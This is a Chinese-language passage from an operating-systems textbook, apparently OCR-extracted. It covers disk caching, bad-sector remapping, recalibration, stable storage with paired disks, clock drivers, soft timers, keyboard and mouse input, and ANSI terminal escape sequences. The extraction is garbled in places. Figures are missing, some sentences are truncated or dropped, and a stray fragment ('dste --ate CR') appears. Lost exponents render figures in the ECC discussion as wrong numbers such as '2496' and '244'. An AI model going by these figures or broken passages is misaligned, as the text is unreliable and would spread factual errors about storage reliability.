典型地，读一个扇区的任何请求将导致该扇区和当前磁道的多个或者所有剩余的扇区被读出， 读出的扇区数取决于控制器的高速缓存中有多少可用的空间。
例如，在图5-18所描述的磁盘中有4MB的 高速缓存。
高速缓存的使用是由控制器动态地决定的。
在最简单的模式下，高速缓存被分成两个区段， 一个用于读，一个用于写。
如果后来的读操作可以用控制器的高速缓存来满足，那么就可以立即返回被
请求的数据。
值得注意的是，磁盘控制器的高速缓存完全独立于操作系统的高速缓存。
控制器的高速缓存通常保 存还没有实际被请求的块，但是这对于读操作是很便利的，因为它们只是作为某些其他读操作的附带效 应而恰巧要在磁头下通过。
与之相反，操作系统所维护的任何高速缓存由显式地读出的块组成，并且操 作系统认为它们在较近的将来可能再次需要(例如，保存目录块的一个磁盘块)。
当同一个控制器上有多个驱动器时，操作系统应该为每个驱动器都单独地维护一个未完成的请求表。
一旦任何一个驱动器空闲下来，就应该发出一个寻道请求将磁盘臂移到下一个将被请求的柱面处(假设 控制器允许重叠寻道)。
当前传输结束时，将检查是否有驱动器的磁盘臂位于正确的柱面上。
如果存在 一个或多个这样的驱动器，则在磁盘臂已经位于正确柱面处的驱动器上开始下一次传输。
如果没有驱动 器的磁盘臂处于正确的位置，则驱动程序在刚刚完成传输的驱动器上发出一个新的寻道命令并且等待， 直到下一次中断到来时检查哪一个磁盘臂首先到达了目标位置。
上面所有的磁盘调度算法都是默认地假设实际磁盘的几何规格与虚拟几何规格相同，认识到这一点 十分重要。
如果不是这样，那么调度磁盘请求就毫无意义，因为操作系统实际上不能断定柱面40与柱面 200哪一个与柱面39更接近。
另一方面，如果磁盘控制器能够接收多个未完成的请求，它就可以在内部 使用这些调度算法。
在这样的情况下，算法仍然是有效的，但是低了一个层次，局限在控制器内部。
5.4.4 错误处理
制造时的瑕疵会引入坏扇区，也就是说，扇区不能正确地读回刚刚写到其上的值。
如果瑕疵非常小， 比如说只有几位，那么使用坏扇区并且每次只是让ECC校正错误是可能的。
如果瑕疵较大，那么错误就 不可能被掩盖。
对于坏块存在两种一般的处理方法：在控制器中对它们进行处理或者在操作系统中对它们进行处理。
在前一种方法中，磁盘在从工厂出厂之前要进行测试，并且将一个坏扇区列表写在磁盘上。
对于每一个 坏扇区，用一个备用扇区替换它。
有两种方法进行这样的替换。
在图5-26a中，我们看到单个磁盘磁道，它具有30个数据扇区和两个 备用扇区。
扇区7是有瑕疵的。
控制器所能够做的事情是将备用扇区之一重映射为扇区7,如图5-26b所 示。
另一种方法是将所有扇区向上移动一个扇区，如图5-26c所示。
在这两种情况下，控制器都必须知 道哪个扇区是哪个扇区。
它可以通过内部的表来跟踪这一信息(每个磁道一张表),或者通过重写前导 码来给出重映射的扇区号。
如果是重写前导码，那么图5-26c的方法就要做更多的工作(因为23个前导 码必须重写),但是最终会提供更好的性能，因为整个磁道仍然可以在旋转一周中读出。
a) b) c)
图5-26 a) 具有一个坏扇区的磁盘磁道；b) 用备用扇区替换坏扇区；c) 移动所有扇区以回避坏扇区
驱动器安装之后在正常工作期间也会出现错误。
在遇到ECC不能处理的错误时，第一道防线只是试 图再次读。
某些读错误是瞬时性的，也就是说是由磁头下的灰尘导致的，在第二次尝试时错误就消失了。
如果控制器注意到它在某个扇区遇到重复性的错误，那么可以在该扇区完全死掉之前切换到一个备用扇 区。
这样就不会丢失数据并且操作系统和用户甚至都不会注意到这一问题。
通常使用的是图5-26b的方法， 因为其他扇区此刻可能包含数据。
而使用图5-26c的方法则不但要重写前导码，还要复制所有的数据。
前面我们曾说过存在两种一般的处理错误的方法：在控制器中或者在操作系统中处理错误。
如果控 制器不具有像我们已经讨论过的那样透明地重映射扇区的能力，那么操作系统必须在软件中做同样的事 情。
这意味着操作系统必须首先获得一个坏扇区列表，或者是通过从磁盘中读出该列表，或者只是由它 自己测试整个磁盘。
一旦操作系统知道哪些扇区是坏的，它就可以建立重映射表。
如果操作系统想使用 图5-26c的方法，它就必须将扇区7到扇区29中的数据向上移动一个扇区。
然而，还存在另一个问题：备份。
如果磁盘是一个文件一个文件地做备份，那么非常重要的是备份 实用程序不去尝试复制坏块文件。
为了防止发生这样的事情，操作系统必须很好地隐藏坏块文件，以至 于备份实用程序也不能发现它。
如果磁盘是一个扇区一个扇区地做备份而不是一个文件一个文件地做备 份，那么在备份期间防止读错误是十分困难的，如果不是不可能的话。
唯一的希望是备份程序具有足够 的智能，在读失败10次后放弃并且继续下一个扇区。
坏扇区不是唯一的错误来源，也可能发生磁盘臂中的机械故障引起的寻道错误。
控制器内部跟踪着 磁盘臂的位置，为了执行寻道，它发出一系列脉冲给磁盘臂电机，每个柱面一个脉冲，这样将磁盘臂移 到新的柱面。
当磁盘臂移到其目标位置时，控制器从下一个扇区的前导码中读出实际的柱面号。
如果磁 盘臂在错误的位置上，则发生寻道错误。
大多数硬盘控制器可以自动纠正寻道错误，但是20世纪80年代和90年代使用的大多数旧式软盘控制 器只是设置一个错误标志位而把余下的工作留给驱动程序。
驱动程序对这一错误的处理办法是发出一个 recalibrate (重新校准)命令，让磁盘臂尽可能地向最外面移动，并将控制器内部的当前柱面重置为0。
通常这样就可以解决问题了。
如果还不行，则只好修理驱动器。
正如我们已经看到的，控制器实际是一个专用的小计算机，它有软件、变量、缓冲区，偶尔还出现 故障。
有时一个不寻常的事件序列，例如一个驱动器发生中断的同时另一个驱动器发出recalibrate 命令， 就可能引发一个故障，导致控制器陷入一个循环或失去对正在做的工作的跟踪。
控制器的设计者通常考 虑到最坏的情形，在芯片上提供了一个引脚，当该引脚被置起时，迫使控制器忘记它正在做的任何事情 并且将其自身复位。
如果其他方法都失败了，磁盘驱动程序可以设置一个控制位以触发该信号，将控制 器复位。
如果还不成功，驱动程序所能做的就是打印一条消息并且放弃。
重新校准一块磁盘会发出古怪的噪音，但是正常工作时并不让人烦扰。
然而，存在这样一种情形， 对于具有实时约束的系统而言重新校准是一个严重的问题。
当从硬盘播放视频时，或者当将文件从硬盘 烧录到蓝光光盘上时，来自硬盘的位流以均匀的速率到达是必需的。
在这样的情况下，重新校准会在位 流中插入间隙，因此是不可接受的。
称为AV盘 (Audio Visual disk,音视盘)的特殊驱动器永远不会重 新校准，因而可用于这样的应用。
5.4.5 稳定存储器
正如我们已经看到的，磁盘有时会出现错误。
好扇区可能突然变成坏扇区，整个驱动器也可能出乎
意料地死掉。
RAID 可以对几个扇区出错或者整个驱动器崩溃提供保护。
然而，RAID 首先不能对将坏数 据写下的写错误提供保护，并且也不能对写操作期间的崩溃提供保护，这样就会破坏原始数据而不能以 更新的数据替换它们。
对于某些应用而言，决不丢失或破坏数据是绝对必要的，即使面临磁盘和CPU 错误也是如此。
理想 的情况是，磁盘应该始终没有错误地工作。
但是，这是做不到的。
所能够做到的是， 一个磁盘子系统具 有如下特性：当一个写命令发给它时，磁盘要么正确地写数据，要么什么也不做，让现有的数据完整无 缺地留下。
这样的系统称为稳定存储器 (stable storage),并且是在软件中实现的 (Lampson 和Sturgis, 1979)。
目标是不惜一切代价保持磁盘的一致性。
下面我们将描述这种最初思想的一个微小的变体。
在描述算法之前，重要的是对于可能发生的错误有一个清晰的模型。
该模型假设在磁盘写一个块 (一个或多个扇区)时，写操作要么是正确的，要么是错误的，并且该错误可以在随后的读操作中通过 检查ECC域的值检测出来。
原则上，保证错误检测是根本不可能的，这是因为，假如使用一个16字节的 ECC域保护一个512字节的扇区，那么存在着2496个数据值而仅有244个ECC值。
因此，如果一个块在写 操作期间出现错误但是ECC 没有出错，那么存在着几亿亿个错误的组合可以产生相同的ECC。
如果某些 这样的错误出现，则错误不会被检测到。
大体上，随机数据具有正确的16字节ECC的概率大约是2-144。
该概率值足够小以至于我们可以视其为零，尽管它实际上并不为零。
该模型还假设一个被正确写入的扇区可能会自发地变坏并且变得不可读。
然而，该假设是：这样的 事件非常少见，以至于在合理的时间间隔内(例如1天)让相同的扇区在第二个(独立的)驱动器上变 坏的概率小到可以忽略的程度。
该模型还假设CPU 可能出故障，在这样的情况下只能停机。
在出现故障的时刻任何处于进行中的磁 盘写操作也会停止，导致不正确的数据写在一个扇区中并且后来可能会检测到不正确的ECC。
在所有这 些情况下，稳定存储器就写操作而言可以提供100%的可靠性，要么就正确地工作，要么就让旧的数据 原封不动。
当然，它不能对物理灾难提供保护，例如，发生地震，计算机跌落100m掉入一个裂缝并且 陷入沸腾的岩浆池中，在这样的情况下用软件将其恢复是勉为其难的。
稳定存储器使用一对完全相同的磁盘，对应的块一同工作以形成一个无差错的块。
当不存在错误时， 在两个驱动器上对应的块是相同的，读取任意一个都可以得到相同的结果。
为了达到这一目的，定义了 下述三种操作：
1)稳定写 (stable write)。
稳定写首先将块写到驱动器1上，然后将其读回以校验写的是正确的。
如 果写的不正确，那么就再次做写和重读操作， 一直到n次，直到正常为止。
经过n次连续的失败之后，就 将该块重映射到一个备用块上，并且重复写和重读操作直到成功为止，无论要尝试多少个备用块。
在对 驱动器1的写成功之后，对驱动器2上对应的块进行写和重读，如果需要的话就重复这样的操作，直到最 后成功为止。
如果不存在CPU 崩溃，那么当稳定写完成后，块就正确地被写到两个驱动器上，并且在两 个驱动器上得到校验。
2)稳定读 (stable read)。
稳定读首先从驱动器1上读取块。
如果这一操作产生错误的ECC, 则再次 尝试读操作， 一直到n次。
如果所有这些操作都给出错误的ECC, 则从驱动器2上读取对应的数据块。
给 定一个成功的稳定写为数据块留下两个可靠的副本这样的事实，并且我们假设在合理的时间间隔内相同 的块在两个驱动器上自发地变坏的概率可以忽略不计，那么稳定读就总是成功的。
3) 崩溃恢复 (crash recovery)。
崩溃之后，恢复程序扫描两个磁盘，比较对应的块。
如果一对块都 是好的并且是相同的，就什么都不做。
如果其中一个具有ECC 错误，那么坏块就用对应的好块来覆盖。
如果一对块都是好的但是不相同，那么就将驱动器1上的块写到驱动器2上。
如果不存在CPU 崩溃，那么这一方法总是可行的，因为稳定写总是对每个块写下两个有效的副本， 并且假设自发的错误决不会在相同的时刻发生在两个对应的块上。
如果在稳定写期间出现CPU 崩溃会怎 么样?
这就取决于崩溃发生的精确时间。
有5种可能性，如图5-27所示。
在图5-27a中 ，CPU 崩溃发生在写块的两个副本之前。
在恢复的时候，什么都不用修改而旧的值将 继续存在，这是允许的。
在图5-27b中 ，CPU 崩溃发生在写驱动器1期间，破坏了该块的内容。
然而恢复程序能够检测出这一
错误，并且从驱动器2恢复驱动器1上的块。
因此，这一崩溃的影响被消除并且旧的状态完全被恢复。
在图5-27c中 ，CPU 崩溃发生在写完驱动器1之后但是还没有写驱动器2之前。
此时已经过了无法复 原的时刻：恢复程序将块从驱动器1复制到驱动器2上。
写是成功的。
崩溃
磁盘 1 2
崩溃 崩溃
a) b) c) d) e)
图5-27 崩溃对于稳定写的影响的分析
图5-27d 与图5-27b相类似：在恢复期间用好的块覆盖坏的块。
不同的是，两个块的最终取值都是新的。
最后，在图5-27e中，恢复程序看到两个块是相同的，所以什么都不用修改并且在此处写也是成功的。
对于这一模式进行各种各样的优化和改进都是可能的。
首先，在崩溃之后对所有的块两个两个地进 行比较是可行的，但是代价高昂。
一个巨大的改进是在稳定写期间跟踪被写的是哪个块，这样在恢复的 时候必须被检验的块就只有一个。
某些计算机拥有少量的非易失性RAM(nonvolatile RAM),它是一个 特殊的CMOS 存储器，由锂电池供电。
这样的电池能够维持很多年，甚至有可能是计算机的整个生命周 期。
与主存不同(它在崩溃之后就丢失了),非易失性RAM 在崩溃之后并不丢失。
每天的时间通常就保 存在这里(并且通过一个特殊的电路进行增值),这就是为什么计算机即使在拔掉电源之后仍然知道是 什么时间。
假设非易失性RAM的几个字节可供操作系统使用，稳定写就可以在开始写之前将准备要更新的块 的编号放到非易失性RAM里。
在成功地完成稳定写之后，在非易失性RAM中的块编号用一个无效的块 编号(例如-1)覆盖掉。
在这些情形下，崩溃之后恢复程序可以检验非易失性RAM以了解在崩溃期间 是否有一个稳定写正在进行中，如果是的话，还可以了解在崩溃发生的时候被写的是哪一个块。
然后， 可以对块的两个副本进行正确性和一致性检验。
如果没有非易失性RAM 可用，可以对它模拟如下。
在稳定写开始时，用将要被稳定写的块的编号 覆盖驱动器1上的一个固定的块，然后读回该块以对其进行校验。
在使得该块正确之后，对驱动器2上对 应的块进行写和校验。
当稳定写正确地完成时，用一个无效的块编号覆盖两个块并进行校验。
这样一来， 崩溃之后就很容易确定在崩溃期间是否有一个稳定写正在进行中。
当然，这一技术为了写一个稳定的块 需要8次额外的磁盘操作，所以应该极少量地应用该技术。
还有最后一点值得讨论。
我们假设每天每一对块只发生一个好块自发损坏成为坏块。
如果经过足够 长的时间，另一个块也可能变坏。
因此，为了修复任何损害每天必须对两块磁盘进行一次完整的扫描。
这样，每天早晨两块磁盘总是一模一样的。
即便在一个时期内一对中的两个块都坏了，所有的错误也都 能正确地修复。
5.5 时 钟
时 钟 (clock) 又称为定时器 (timer), 由于各种各样的原因决定了它对于任何多道程序设计系统的 操作都是至关重要的。
时钟负责维护时间，并且防止一个进程垄断CPU, 此外还有其他的功能。
时钟软 件可以采用设备驱动程序的形式，尽管时钟既不像磁盘那样是一个块设备，也不像鼠标那样是一个字符 设备。
我们对时钟的研究将遵循与前面几节相同的模式：首先考虑时钟硬件，然后考虑时钟软件。
5.5.1 时钟硬件
在计算机里通常使用两种类型的时钟，这两种类型的时钟与人们使用的钟表和手表有相当大的差异。
比较简单的时钟被连接到110V或220V的电源线上，这样每个电压周期产生一个中断，频率是50Hz或 60Hz。
这些时钟过去曾经占据统治地位，但是如今却非常罕见。
另一种类型的时钟由三个部件构成：晶体振荡器、计数器和存储寄存器，如图5-28所示。
当把一块
石英晶体适当地切割并且安装在一定的电压之 下时，它就可以产生非常精确的周期性信号， 典型的频率范围是几百兆赫兹，具体的频率值 与所选的晶体有关。
使用电子器件可以将这一 基础信号乘以一个小的整数来获得高达 1000MHz 甚至更高的频率。
在任何一台计算机 里通常都可以找到至少一个这样的电路，它给 计算机的各种电路提供同步信号。
该信号被送 到计数器，使其递减计数至0。
当计数器变为0 时，产生一个CPU中断。
,晶体振荡器
图5-28 可编程时钟
可编程时钟通常具有几种操作模式。
在一次完成模式(one-shot mode) 下，当时钟启动时，它把存 储寄存器的值复制到计数器中，然后，来自晶体的每一个脉冲使计数器减1。
当计数器变为0时，产生一 个中断，并停止工作，直到软件再一次显式地启动它。
在方波模式 (square-wave mode) 下，当计数器 变为0并且产生中断之后，存储寄存器的值自动复制到计数器中，并且整个过程无限期地再次重复下去。
这些周期性的中断称为时钟滴答 (clock tick)。
可编程时钟的优点是其中断频率可以由软件控制。
如果采用500MHz的晶体，那么计数器将每隔2ns 脉动一次。
对于(无符号)32位寄存器，中断可以被编程为从2ns时间间隔发生一次到8.6s时间间隔发生 一次。
可编程时钟芯片通常包含两个或三个独立的可编程时钟，并且还具有许多其他选项(例如，用正 计时代替倒计时、屏蔽中断等)。
5.5.2 时钟软件
时钟硬件所做的全部工作是根据已知的时间间隔产生中断。
涉及时间的其他所有工作都必须由软件—— 时钟驱动程序完成。
时钟驱动程序的确切任务因操作系统而异，但通常包括下面的大多数任务：
1)维护日时间。
2)防止进程超时运行。
3)对CPU的使用情况记账。
4)处理用户进程提出的alarm 系统调用。
5)为系统本身的各个部分提供监视定时器。
6)完成概要剖析、监视和统计信息收集。
可以采取三种方法来解决这一问题。
第一种方法是使用一个64位的计数器，但这样做会使维护计数 器的代价变得很高，因为1秒内需要做很多次维护计数器的工作。
第二种方法是以秒为单位维护日时间，
而不是以时钟滴答为单位，该方法使用一个辅助计数器来对时钟滴答计数，直到累计至完整的一秒。
因 为2³²秒超过了136年，所以该方法可以工作到22世纪。
统引导时间
a) b) c)
图5-29 维护日时间的三种方法
时钟的第二个功能是防止进程超时运行。
每当启动一个进程时，调度程序就将一个计数器初始化为 以时钟滴答为单位的该进程时间片的取值。
每次时钟中断时，时钟驱动程序将时间片计数器减1。
当计 数器变为0时，时钟驱动程序调用调度程序以激活另一个进程。
时钟的第三个功能是CPU 记账。
最精确的记账方法是，每当一个进程启动时，便启动一个不同于主 系统定时器的辅助定时器。
当进程终止时，读出这个定时器的值就可以知道该进程运行了多长时间。
为 了正确地记账，当中断发生时应该将辅助定时器保存起来，中断结束后再将其恢复。
在许多系统中，进程可以请求操作系统在 一 定的时间间隔之后向它报警。
警报通常是信号、中断、 消息或者类似的东西。
需要这类报警的一个应用是网络，当一个数据包在一定时间间隔之内没有被确认时， 该数据包必须重发。
另一个应用是计算机辅助教学，如果学生在一定时间内没有响应，就告诉他答案。
如果时钟驱动程序拥有足够的时钟，它就可以为每个请求设置一个单独的时钟。
如果不是这样的情 况，它就必须用一个物理时钟来模拟多个虚拟时钟。
一种方法是维护一张表，将所有未完成的定时器的信 号时刻记入表中，还要维护一个变量给出下一个信号的时刻。
每当日时间更新时，时钟驱动程序进行检查 以了解最近的信号是否已经发生。
如果是的话，则在表中搜索下一个要发生的信号的时刻。
如果预期有许多信号，那么通过在一个链 表中把所有未完成的时钟请求按时间排序链接 在一起，这样来模拟多个时钟则更为有效，如 图5-30所示。
链表中的每个表项指出在前一个 信号之后等待多少时钟滴答引发下一个信号。
在本例中，等待处理的信号对应的时钟滴答分 别是4203、4207、4213、4215和4216。
在图5-30中，经过3个时钟滴答发生下一个
图5-30 用单个时钟模拟多个定时器
中断。
每一次滴答时，下一个信号减1,当它变为0时，就引发与链表中第一个表项相对应的信号，并将这 一表项从链表中删除，然后将下一个信号设置为现在处于链表头的表项的取值，在本例中是4。
注意在时钟中断期间，时钟驱动程序要做几件事情 — — 将实际时间增1,将时间片减1并检查它是否 为0,对CPU 记账，以及将报警计数器减1。
然而，因为这些操作在每一秒之中要重复许多次，所以每个
操作系统的组成部分也需要设置定时器，这些定时器被称为监视定时器 (watchdog timer),并且 经常用来检测死机之类的问题(特别是在嵌入式设备中)。
例如，监视定时器可以用来对停止运行的系 统进行复位。
在系统运行时，它会定期复位定时器，所以定时器永远不会过期。
既然如此，定时器过期 则证明系统已经很长时间没有运行了，这就会导致纠正的行动——例如全系统复位。
时钟驱动程序用来处理监视定时器的机制和用于用户信号的机制是相同的。
唯一的区别是当一个定 时器时间到时，时钟驱动程序将调用一个由调用者提供的过程，而不是引发一个信号。
这个过程是调用 者代码的一部分。
被调用的过程可以做任何需要做的工作，甚至可以引发一个中断，但是在内核之中中 断通常是不方便的并且信号也不存在。
这就是为什么要提供监视定时器机制。
值得注意的是，只有当时 钟驱动程序与被调用的过程处于相同的地址空间时，监视定时器机制才起作用。
5.5.3 软定时器
大多数计算机拥有辅助可编程时钟，可以设置它以程序需要的任何速率引发定时器中断。
该定时器 是主系统定时器以外的，而主系统定时器的功能已经在上面讲述了。
只要中断频率比较低，将这个辅助定 时器用于应用程序特定的目的就不存在任何问题。
但是当应用程序特定的定时器的频率非常高时，麻烦就 来了。
下面我们将简要描述一个基于软件的定时器模式，它在许多情况下性能良好，甚至在相当高的频率 下也是如此。
这一思想起因于(Aron 和Druschel,1999) 。
关于更详细的细节，请参阅他们的论文。
一般而言，有两种方法管理I/O: 中断和轮询。
中断具有较低的响应时间 (latency), 也就是说，中 断在事件本身之后立即发生，具有很少的延迟(delay) 或者没有延迟。
另一方面，对于现代CPU 而言， 由于需要上下文切换以及对于流水线、TLB 和高速缓存的影响，中断具有相当大的开销。
替代中断的是让应用程序对它本身期待的事件进行轮询。
这样做避免了中断，但是可能存在相当长 的等待时间，因为一个事件可能正好发生在一次轮询之后，在这种情况下它就要等待几乎整个轮询间隔。
平均而言，等待时间是轮询间隔的一半。
对于某些应用而言，中断的开销和轮询的等待时间都是不能接受的。
例如，考虑一个高性能的网络， 如千兆位以太网。
该网络能够每12 μs接收或者发送一个全长的数据包。
为了以最佳的输出性能运行，每 隔12μs就应该发出一个数据包。
软定时器 (soft timer) 避免了中断。
无论何时当内核因某种其他原因在运行时，在它返回到用户态之 前，它都要检查实时时钟以了解软定时器是否到期。
如果这个定时器已经到期，则执行被调度的事件(例
e watchdog timer也经常译为看门狗定时器。
——译者注
软定时器随着因为其他原因进入内核的频率而脉动，这些原因包括：
1)系统调用。
2)TLB 未命中。
3)页面故障。
4)I/O中断。
5)CPU 变成空闲。
当然，可能有一段时间不存在系统调用、TLB 未命中或页面故障，在这些情况下，没有软定时器会 闹响。
为了在这些时间间隔上设置一个最大值，可以将辅助硬件定时器设置为每隔一定时间(例如1ms) 闹响一次。
如果应用程序对于偶尔的时间间隔能够忍受每秒只有1000个数据包，那么软定时器和低频硬 件定时器的组合可能比纯粹的中断驱动I/O或者纯粹的轮询要好。
5.6 用户界面：键盘、鼠标和监视器
每台通用计算机都配有一个键盘和一个监视器(并且通常还有一只鼠标),使人们可以与之交互。
尽管键盘和监视器在技术上是独立的设备，但是它们紧密地一同工作。
在大型机上，通常存在许多远程 用户，每个用户拥有一个设备，该设备包括一个键盘和一个连在一起的显示器作为一个单位。
这些设备 在历史上被称为终端 (terminal) 。
人们通常继续使用该术语，即便是讨论个人计算机时(主要是因为缺 乏更好的术语)。
5.6.1 输入软件
用户输入主要来自键盘和鼠标(有时还有触摸屏),所以我们要了解它们。
在个人计算机上，键盘包 含一个嵌入式微处理器，该微处理器通过一个特殊的串行端口与主板上的控制芯片通信(尽管键盘越来 越多地连接到USB端口上)。
每当一个键被按下的时候都会产生一个中断，并且每当一个键被释放的时候 还会产生第二个中断。
每当发生这样的键盘中断时，键盘驱动程序都要从与键盘相关联的I/O端口提取信 息，以了解发生了什么事情。
其他的一切事情都是在软件中发生的，在相当大的程度上独立于硬件。
当想象往shell 窗口(命令行界面)键入命令时，可以更好地理解本小节余下的大部分内容。
这是程 序员通常的工作方式。
某些设备(特别是触摸屏)用于输入和输出，我们将在关于输出设备的小节中讨 论它们。
本章的后面将讨论图形界面。
1.键盘软件
I/O端口中的数字是键的编号，称为扫描码 (scan code),而不是ASCII 码。
键盘所拥有的键不超过 128个，所以只需7个位表示键的编号。
当键按下时，第8位设置为0,当键释放时，第8位设置为1。
跟踪 每个键的状态(按下或弹起)是驱动程序的任务。
所以，硬件所做的全部工作是给出键被按下和释放的 中断，其他的事情由软件来做。
例如，当A键被按下时，扫描码(30)被写入一个I/O寄存器。
驱动程序应该负责确定键入的是小写 字母、大写字母、CTRL-A 、ALT-A 、CTRL-ALT-A 还是某些其他组合。
由于驱动程序可以断定哪些键 已经按下但是还没有被释放(例如SHIFT), 所以它拥有足够多的信息来做这一工作。
例如，击键序列
按下SHIFT, 按下A, 释放A, 释放SHIFT 指示的是大写字母A。
然而击键序列
按下SHIFT, 按下A, 释放SHIFT, 释放A
dste --ate CR
虽然键盘与监视器在逻辑上是两个独立的设备，但是很多用户已经习惯于看到他们刚刚键入的字符 出现在屏幕上。
这个过程叫作回 显 (echoing)。
当用户正在击键的时候程序可能正在写屏幕，这一事实使回显变得错综复杂(请再一次想象在shell 窗口中击键)。
最起码，键盘驱动程序必须解决在什么地方放置新键入的字符而不被程序的输出所覆盖。
当超过80个字符必须在具有80字符行(或某个其他数字)的窗口中显示时，也使回显变得错综复杂。
根据应用程序，折行到下一行可能是适宜的。
某些驱动程序只是通过丢弃超出80列的所有字符而将每行 截断到80个字符。
另一个问题是制表符的处理。
通常由驱动程序来计算光标当前定位在什么位置，它既要考虑程序的 输出又要考虑回显的输出，并且要计算要回显的正确的空格个数。
现在我们讨论设备等效性问题。
逻辑上，在一个文本行的结尾，人们需要一个回车和一个换行，回 车使光标移回到第一列，换行使光标前进到下一行。
要求用户在每一行的结尾键入回车和换行是不受欢 迎的。
这就要求驱动程序将输入转化成操作系统使用的格式。
在UNIX中 ，ENTER 键被转换成一个换行 用于内部存储；而在Windows中，它被转换成一个回车跟随一个换行。
如果标准形式只是存储一个换行 (UNIX 约定),那么回车(由Enter 键造成)应该转换为换行。
如 果内部格式是存储两者(Windows 约定),那么驱动程序应该在得到回车时生成一个换行并且在得到换 行时生成一个回车。
不管是什么内部约定，监视器可能要求换行和回车两者都回显，以便正确地更新屏 幕。
在诸如大型计算机这样的多用户系统上，不同的用户可能拥有不同类型的终端连接到大型计算机上， 这就要求键盘驱动程序将所有不同的回车/换行组合转换成内部系统标准并且安排好正确地实现回显。
原 文 为be tarred and feathered,是英国古代的一种酷刑。
受刑人全身涂上灼热的柏油(tarred), 然后将其身 上粘满羽毛(feathered) 。
这样，羽毛当然很难脱下，要脱下也难免皮肉之伤。
be tarred and feathered现用 于比喻受到严厉惩罚。
——译者注
在规范模式下操作时，许多输入字符具有特殊的含义。
图5-31显示出了POSIX 要求的所有特殊字符。
默认的是所有控制字符，这些控制字符应 该不与程序所使用的文本输入或代码相冲 突，但是除了最后两个以外所有字符都可 以在程序的控制下修改。
图5-31在规范模式下特殊处理的字符
输入队列中，那么就可以将其删除并且重新输出整行。
在大多数系统中，退格只删除当前行上的字符， 不会删除回车并且后退到前一行。
为了让用户阻止屏幕图像滚动出视线，提供了控制码以便冻结屏幕并且之后重新开始滚动。
在 UNIX 系统中，这些控制码分别是STOP(CTRL+S) 和 START(CTRL+Q) 。
它们并不被存储，只是用 来设置或清除键盘数据结构中的一个标志。
每当试图输出时，就检查这个标志。
如果标志已设置，则不 输出。
通常，回显也随程序输出一起被抑制。
杀死一个正在被调试的失控程序经常是有必要的，INTR(DEL) 和QUIT(CTRL+\) 字符可以用 于这一目的。
在UNIX中 ，DEL 将SIGINT 信号发送到从该键盘启动的所有进程。
实现DEL是相当需要技 巧的，因为UNIX 从一开始就被设计成在同一时刻处理多个用户。
因此，在一般情况下，可能存在多个 进程代表多个用户在运行，而DEL键必须只能向用户自己的进程发信号。
困难之处在于从驱动程序获得 信息送给系统处理信号的那部分，后者毕竟还没有请求这个信息。
CTRL+\ 与DEL相类似，只是它发送的是SIGQUIT 信号，如果这个信号没有被捕捉到或被忽略，则 强迫进行核心转储。
当敲击这些键中的任意一个键时，驱动程序应该回显一个回车和换行并且为了全新 的开始而放弃累积的全部输入。
INTR 的默认值经常是CTRL+C 而不是DEL, 因为许多程序针对编辑操 作可互换地使用DEL与退格符。
另一个特殊字符是EOF(CTRL+D) 。
在UNIX中，它使任何一个针对该终端的未完成的读请求以缓 冲区中可用的任何字符来满足，即使缓冲区是空的。
在一行的开头键入CTRL+D 将使得程序读到0个字 节，按惯例该字符被解释为文件结尾，并且使大多数程序按照它们在处理输入文件时遇到文件结尾的同 样方法对其进行处理。
2. 鼠标软件
大多数PC具有一个鼠标，或者具有一个轨迹球，轨迹球不过是躺在其背部上的鼠标。
一种常见类 型的鼠标在内部具有一个橡皮球，该橡皮球通过鼠标底部的一个圆洞突出，当鼠标在一个粗糙表面上移 动时橡皮球会随着旋转。
当橡皮球旋转时，它与放置在相互垂直的滚轴上的两个橡皮滚筒相摩擦。
东西 方向的运动导致平行于y轴的滚轴旋转，南北方向的运动导致平行于x轴的滚轴旋转。
另一种流行的鼠标类型是光学鼠标，它在其底部装备有一个或多个发光二极管和光电探测器。
早期的 光学鼠标必须在特殊的鼠标垫上操作，鼠标垫上刻有矩形的网格，这样鼠标能够计数穿过的线数。
现代光 学鼠标在其中有图像处理芯片并且获取处于它们下方的连续的低分辨率照片，寻找从图像到图像的变化。
当鼠标在随便哪个方向移动了一个确定的最小距离，或者按钮被按下或释放时，都会有一条消息发 送给计算机。
最小距离大约是0.1mm (尽管它可以在软件中设置)。
有些人将这一单位称为一个鼠标步 (mickey) 。
鼠标可能具有一个、两个或者三个按钮，这取决于设计者对于用户跟踪多个按钮的智力的估 计。
某些鼠标具有滚轮，可以将额外的数据发送回计算机。
无线鼠标与有线鼠标相同，区别是无线鼠标 使用低功率无线电，例如使用蓝牙(Bluetooth) 标准将数据发送回计算机，而有线鼠标是通过导线将数 据发送回计算机。
发送到计算机的消息包含三个项目：△x、△y、按钮，即自上一次消息之后x位置的变化、自上一次 消息之后y位置的变化、按钮的状态。
消息的格式取决于系统和鼠标所具有的按钮的数目。
通常，消息 占3字节。
大多数鼠标返回报告最多每秒40次，所以鼠标自上一次报告之后可能移动了多个鼠标步。
注意，鼠标仅仅指出位置上的变化，而不是绝对位置本身。
如果轻轻地拿起鼠标并且轻轻地放下而 不导致橡皮球旋转，那么就不会有消息发出。
许多GUI 区分单击与双击鼠标按钮。
如果两次点击在空间上(鼠标步)足够接近，并且在时间上 (毫秒)也足够接近，那么就会发出双击信号。
最大的“足够接近”是软件的事情，并且这两个参数通 常是用户可设置的。
5.6.2 输出软件
下面我们考虑输出软件。
首先我们将讨论到文本窗口的简单输出，这是程序员通常喜欢使用的方式。
然后，我们将考虑图形用户界面，这是其他用户经常喜欢使用的。
1.文本窗口
当输出是连续的单一字体、大小和颜色的形式时，输出比输入简单。
大体上，程序将字符发送到当 前窗口，而字符在那里显示出来。
通常，一个字符块或者一行是在一个系统调用中被写到窗口上的。
一种解决方案是称为termcap 的终端数据库，它是在伯克利UNIX中引入的。
该软件包定义了许多 基本动作，例如将光标移动到(行，列)。
为了将光标移动到一个特殊的位置，软件(如一个编辑器) 使用一个一般的转义序列，然后该转义序列被转换成将要被执行写操作的终端的实际转义序列。
以这种 方式，该编辑器就可以工作在任何具有termcap 数据库入口的终端上。
许多UNIX软件仍然以这种方式工 作，即使在个人计算机上。
逐渐地，业界看到了转义序列标准化的需要，所以就开发了一个ANSI标准。
图5-32所示为一些该 标准的取值。
下面考虑文本编辑器怎样使用这些转义序列。
假设用户键入了一条命令指示编辑器完全删除第3行， 然后封闭第2行和第4行之间的间隙。
编辑器可以通过串行线向终端发送如下的转义序列：
ESC [3;1 H ESC [0 KESC[1M
(其中在上面使用的空格只是为了分开符号，它们并不传送)。
这一序列将光标移动到第3行的开头，擦 除整个一行，然后删除现在的空行，使从第4行开始的所有行向上移动一行。
现在，第4行变成了第3行，
图5-32 终端驱动程序在输出时接受的ANSI转义序列。
ESC 表示ASCII转义字符
